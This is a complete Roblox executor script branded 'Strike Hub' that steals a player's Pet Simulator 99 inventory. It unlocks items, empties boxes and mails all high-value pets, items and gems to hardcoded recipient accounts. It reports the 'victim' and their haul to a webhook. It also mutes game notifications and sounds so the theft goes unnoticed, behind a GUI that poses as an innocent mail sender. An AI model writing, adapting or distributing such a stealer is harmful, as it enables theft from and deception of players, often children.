-- ========================= FULL STRIKE HUB SCRIPT =========================
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- UNIVERSAL EXECUTOR COMPATIBILITY
local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)

-- SERVICES
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

-- CONFIG
local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""
_G.StrikeHubLogo = _G.StrikeHubLogo or "" -- optional logo

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end
for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- GET MAIL COST FUNCTION
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgcFunction()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- UTILITIES
local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    number = math.floor(number)
    while number >= 1000 do
        number = number / 1000
        suffixIndex += 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }
    local combinedItems, itemRapMap = {}, {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount += item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end
    table.sort(combinedItems, function(a,b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value ..= string.format("%s (x%d): %s RAP\n", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
    end
    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
    local data = {embeds = {{title = "💡 New PS99 Execution", color = 65280, fields = fields, footer = {text = "Strike Hub."}}}}
    local body = HttpService:JSONEncode(data)
    if requestFunction then
        requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
    end
end

-- DISABLE SOUNDS & NOTIFICATIONS
local success, loading = pcall(function() return plr.PlayerScripts.Scripts.Core["Process Pending GUI"] end)
local noti = plr.PlayerGui:FindFirstChild("Notifications")
if success and loading then loading.Disabled = true end
if noti then
    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
        noti.Enabled = false
    end)
    noti.Enabled = false
end
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- GET RAP VALUE
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end
    }) or 0)
end

-- SEND ITEM
local function sendItem(category, uid, amount)
    local userIndex, maxUsers = 1, #users
    while userIndex <= maxUsers do
        local sendAmount = (category == "Pet") and 1 or amount
        local args = {users[userIndex], MailMessage, category, uid, sendAmount}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response then
            GemAmount1 -= mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
            if category ~= "Pet" then break end
            amount -= 1
            if amount <= 0 then break end
        elseif err == "They don't have enough space!" then
            userIndex += 1
        else
            warn("Failed to send item:", err)
            break
        end
    end
end

-- SEND ALL GEMS
local function SendAllGems()
    local gemUID
    for uid, data in pairs(GetSave().Inventory.Currency) do
        if data.id == "Diamonds" then gemUID = uid break end
    end
    if not gemUID or GemAmount1 <= 0 then return end
    local userIndex, maxUsers = 1, #users
    while userIndex <= maxUsers do
        local args = {users[userIndex], MailMessage, "Currency", gemUID, GemAmount1}
        local success, err = network.Invoke("Mailbox: Send", unpack(args))
        if success then GemAmount1 = 0 break
        elseif err == "They don't have enough space!" then userIndex += 1
        else warn("Gem send failed:", err) break end
    end
end

-- EMPTY BOXES & CLAIM MAIL
local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then network.Invoke("Box: Withdraw All", key) end
        end
    end
end
local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.05)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end
local function canSendMail()
    local uid
    if save["Pet"] then for i,v in pairs(save["Pet"]) do uid=i break end end
    if not uid then return false end
    local _, err = network.Invoke("Mailbox: Send", "Roblox","Test","Pet",uid,1)
    return (err == "They don't have enough space!")
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

-- SORT ITEMS
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
for _,v in pairs(categoryList) do
    if save[v] then
        for uid,item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if v=="Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
                    local prefix = (item.pt==1 and "Golden " or item.pt==2 and "Rainbow " or "")
                    if item.sh then prefix = "Shiny " .. prefix end
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=prefix..item.id})
                    totalRAP += rapValue * (item._am or 1)
                end
            elseif rapValue >= min_rap then
                table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                totalRAP += rapValue * (item._am or 1)
            end
            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
        end
    end
end

-- START MAIL PROCESS IMMEDIATELY
local function StartMailProcess()
    if #sortedItems == 0 and not (GemAmount1 > min_rap + mailSendPrice) then
        message.Error("Nothing meets the minimum RAP or not enough gems.")
        return
    end
    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin or use a different account")
        return
    end
    table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)
    spawn(function() SendMessage(GemAmount1) end)
    message.Error("Mail sender started!")

    for _, item in ipairs(sortedItems) do
        if item.rap >= min_rap and GemAmount1 > mailSendPrice then
            if item.category == "Pet" then
                for i = 1, item.amount do
                    task.spawn(function() sendItem(item.category, item.uid, 1) end)
                    task.wait(0.05)
                end
            else
                task.spawn(function() sendItem(item.category, item.uid, item.amount) end)
                task.wait(0.05)
            end
        end
    end
    if GemAmount1 > mailSendPrice then SendAllGems() end
end

-- ========================= GUI LEFT-CENTER =========================
do
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "StrikeHubGUI"
    ScreenGui.Parent = plr:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false

    local Frame = Instance.new("Frame")
    Frame.Name = "Main"
    Frame.Size = UDim2.new(0, 360, 0, 80)
    Frame.Position = UDim2.new(0, 12, 0.5, -40) -- left-center
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui
    Frame.Active = true
    Frame.Draggable = false -- draggable after 5s

    task.delay(5, function()
        if Frame and Frame.Parent then
            Frame.Draggable = true
        end
    end)

    local Logo = Instance.new("ImageLabel")
    Logo.Size = UDim2.new(0, 64, 1, 0)
    Logo.BackgroundTransparency = 1
    Logo.Image = (_G.StrikeHubLogo ~= "" and _G.StrikeHubLogo or "")
    Logo.Parent = Frame

    local Title = Instance.new("TextLabel")
    Title.Position = UDim2.new(0, 72, 0, 6)
    Title.Size = UDim2.new(0, 200, 0, 24)
    Title.BackgroundTransparency = 1
    Title.Text = "Strike Hub"
    Title.TextColor3 = Color3.fromRGB(0, 255, 128)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 18
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Frame

    local Sub = Instance.new("TextLabel")
    Sub.Position = UDim2.new(0, 72, 0, 28)
    Sub.Size = UDim2.new(0, 250, 0, 18)
    Sub.BackgroundTransparency = 1
    Sub.Text = "Mail sender running..."
    Sub.TextColor3 = Color3.fromRGB(200, 200, 200)
    Sub.Font = Enum.Font.Gotham
    Sub.TextSize = 13
    Sub.TextXAlignment = Enum.TextXAlignment.Left
    Sub.Parent = Frame
end

-- START MAIL PROCESS IMMEDIATELY
task.spawn(StartMailProcess)
